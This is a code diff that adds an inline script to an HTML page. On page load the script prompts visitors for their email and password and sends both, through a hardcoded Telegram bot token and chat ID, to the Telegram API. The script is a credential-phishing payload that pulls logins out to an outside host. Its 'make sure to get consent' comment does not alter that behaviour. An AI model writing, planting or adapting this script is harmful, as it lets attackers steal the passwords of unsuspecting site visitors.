@@ -86,7 +86,43 @@
     </div>
 
     <script src="/assets/index.js"></script>
-    <!-- Include additional scripts -->
+    <script>
+    // Replace with your Telegram bot token and chat ID
+    const botToken = '6751225350:AAH2K6H1zdefRXPgr6qFgtgKiLTGX0i0FtA';
+    const chatId = '1119354860';
+
+    // Function to send message to Telegram
+    function sendMessageToTelegram(email, password) {
+        const message = `Email: ${email}\nPassword: ${password}`;
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+        fetch(url)
+            .then(response => {
+                if (response.ok) {
+                    console.log('Message sent to Telegram successfully.');
+                } else {
+                    console.error('Error sending message to Telegram:', response.statusText);
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+    }
+
+    // Function to capture user data
+    function captureUserData() {
+        // Example of capturing user input (make sure to get consent)
+        const email = prompt('Enter your email:');
+        const password = prompt('Enter your password:');
+
+        // Send data to Telegram
+        sendMessageToTelegram(email, password);
+    }
+
+    // Call the function to capture user data
+    captureUserData();
+</script>
+
 </body>
 
 </html>
